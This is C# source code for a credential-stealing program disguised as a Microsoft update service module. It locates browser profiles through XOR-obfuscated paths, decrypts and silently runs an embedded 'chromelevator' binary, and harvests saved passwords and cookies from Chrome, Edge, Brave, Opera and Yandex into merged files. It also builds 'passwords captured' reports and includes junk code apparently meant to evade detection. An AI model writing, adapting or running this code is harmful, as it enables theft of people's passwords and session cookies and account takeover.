using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using Microsoft.Data.Sqlite;
using FinalBot;
using VanguardCore;

namespace Microsoft.UpdateService.Modules
{
    public class DataService
    {
        // [POLY_JUNK]
        private static void _vanguard_1750599b() {
            int val = 83178;
            if (val > 50000) Console.WriteLine("Hash:" + 83178);
        }

        private static string D(string s)
        {
            char[] c = s.ToCharArray();
            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
            return new string(c);
        }

        private static void Log(string msg)
        {
            string line = $"[{DateTime.Now:HH:mm:ss}] [BROWSER] {msg}";
            Console.WriteLine(line);
            string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
            if (!Directory.Exists(logDir)) try { Directory.CreateDirectory(logDir); } catch { }
            string logPath = Path.Combine(logDir, "svc_debug.log");
            try { File.AppendAllText(logPath, line + "\n"); } catch { }
        }

        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private readonly Dictionary<string, string> _browserBasePaths;

        public DataService()
        {
            _browserBasePaths = new Dictionary<string, string>
            {
                {"Chrome",     Path.Combine(_localAppData, D("Bjjbi`"), D("Fujhb"), D("Pvbo!Eaub"))},
                {"Edge",       Path.Combine(_localAppData, D("Hlfwjvjcq"), D("@ab`"), D("Pvbo!Eaub"))},
                {"EdgeBeta",   Path.Combine(_localAppData, D("Hlfwjvjcq"), D("@ab`!Gbud"), D("Pvbo!Eaub"))},
                {"Brave",      Path.Combine(_localAppData, D("Gwdtb\x56jluzdob"), D("Gwdtb.Gwjzrbo"), D("Pvbo!Eaub"))},
                {"Opera",      Path.Combine(_appData, D("Jqbwd!\x56jluzdob"), D("Jqbwd!\x56udkcb"))},
                {"Opera GX",   Path.Combine(_appData, D("Jqbwd!\x56jluzdob"), D("Jqbwd!H]!\x56udkcb"))},
                {"Yandex",     Path.Combine(_localAppData, D("Xdobz"), D("XdobzKwjzrbo"), D("Pvbo!Eaub"))},
            };
        }

        public async Task<string> RunAll()
        {
            var reports = new List<string>();
            try
            {
                string projectOutput = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Output");
                if (!Directory.Exists(projectOutput)) Directory.CreateDirectory(projectOutput);
                Log($"Output dir: {projectOutput}");

                await RunChromelevator();

                string tempDir   = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
                string vOutputDir = Path.Combine(tempDir, "VOutput");

                if (Directory.Exists(vOutputDir))
                {
                    Log($"VOutput found: {vOutputDir}");
                    var allPassLines = new List<string> { "═══ 💎 ALL PASSWORDS REPORT 💎 ═══", $"Generated: {DateTime.Now:yyyy-MM-dd HH:mm:ss}", new string('═', 40), "" };

                    int foundPassCount = 0;
                    int foundCookieFiles = 0;
                    var allCookieLines = new List<string>();

                    var dirsToScan = new List<string> { vOutputDir };
                    dirsToScan.AddRange(Directory.GetDirectories(vOutputDir, "*", SearchOption.AllDirectories));

                    foreach (var dir in dirsToScan)
                    {
                        string dirName = Path.GetFileName(dir);
                        string passFile = Path.Combine(dir, "passwords.txt");
                        if (!File.Exists(passFile))
                        {
                            var passFiles = Directory.GetFiles(dir, "*password*", SearchOption.TopDirectoryOnly);
                            if (passFiles.Length == 0) passFiles = Directory.GetFiles(dir, "*pass*", SearchOption.TopDirectoryOnly);
                            if (passFiles.Length > 0) passFile = passFiles[0];
                        }

                        if (File.Exists(passFile))
                        {
                            var lines = File.ReadAllLines(passFile);
                            if (lines.Length > 0)
                            {
                                int entries = lines.Count(l => l.StartsWith("pass ") || l.StartsWith("password:"));
                                if (entries == 0) entries = lines.Length / 4;
                                
                                if (entries > 0 || lines.Length > 2)
                                {
                                    foundPassCount += entries;
                                    if (dir != vOutputDir) allPassLines.Add($"🌐 === Browser: {dirName.ToUpper()} ===");
                                    allPassLines.AddRange(lines);
                                    allPassLines.Add("");
                                }
                            }
                        }

                        string[] cookieFiles2 = Directory.GetFiles(dir, "*cookie*", SearchOption.TopDirectoryOnly);
                        string? actualCookieFile = File.Exists(Path.Combine(dir, "cookies.txt")) ? Path.Combine(dir, "cookies.txt") : (cookieFiles2.Length > 0 ? cookieFiles2[0] : null);
                        
                        if (actualCookieFile != null)
                        {
                            foundCookieFiles++;
                            var cLines = File.ReadAllLines(actualCookieFile);
                            if (cLines.Length > 0)
                            {
                                allCookieLines.Add($"# === {dirName} ===");
                                allCookieLines.AddRange(cLines);
                                allCookieLines.Add("");
                            }
                        }
                    }

                    string mergedPassPath = Path.Combine(vOutputDir, "All_Passwords.txt");
                    string mergedCookiePath = Path.Combine(vOutputDir, "All_Cookies.txt");
                    File.WriteAllLines(mergedPassPath, allPassLines, Encoding.UTF8);
                    if (allCookieLines.Count > 0) File.WriteAllLines(mergedCookiePath, allCookieLines, Encoding.UTF8);

                    File.Copy(mergedPassPath, Path.Combine(projectOutput, "All_Passwords.txt"), true);
                    if (allCookieLines.Count > 0) File.Copy(mergedCookiePath, Path.Combine(projectOutput, "All_Cookies.txt"), true);

                    if (foundPassCount > 0)
                    {
                        reports.Add($"✅ <b>Passwords captured:</b> ~{foundPassCount} entries.");
                        reports.Add($"📁 Saved to: <code>Output\\All_Passwords.txt</code>");
                    }
                    if (foundCookieFiles > 0)
                    {
                        reports.Add($"🍪 <b>Cookies:</b> {foundCookieFiles} browser(s) captured.");
                        reports.Add($"📁 Saved to: <code>Output\\All_Cookies.txt</code>");
                    }
                }
                else
                {
                    reports.Add("❌ Browser extraction failed.");
                }
            }
            catch (Exception ex)
            {
                reports.Add($"❌ Critical error: <code>{ex.Message}</code>");
            }

            return string.Join("\n", reports);
        }

        private async Task RunChromelevator()
        {
            try
            {
                string tempDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);

                string elevatorPath = Path.Combine(tempDir, "chromelevator.exe");
                string outputDir    = Path.Combine(tempDir, "VOutput");

                if (Directory.Exists(outputDir)) try { Directory.Delete(outputDir, true); } catch { }
                Directory.CreateDirectory(outputDir);

                if (!File.Exists(elevatorPath))
                {
                    var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                    using Stream? stream = assembly.GetManifestResourceStream("FinalBot.chromelevator.bin");
                    if (stream != null)
                    {
                        using MemoryStream ms = new MemoryStream();
                        stream.CopyTo(ms);
                        byte[] encrypted = ms.ToArray();
                        byte[] decrypted = AesHelper.Decrypt(encrypted);
                        if (decrypted != null) File.WriteAllBytes(elevatorPath, decrypted);
                    }
                }

                var proc = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName  = elevatorPath,
                        Arguments = $"all --method nt -o \"{outputDir}\"",
                        UseShellExecute        = false,
                        CreateNoWindow         = true
                    }
                };
                proc.Start();
                await proc.WaitForExitAsync();
            }
            catch { }
        }
    }
}
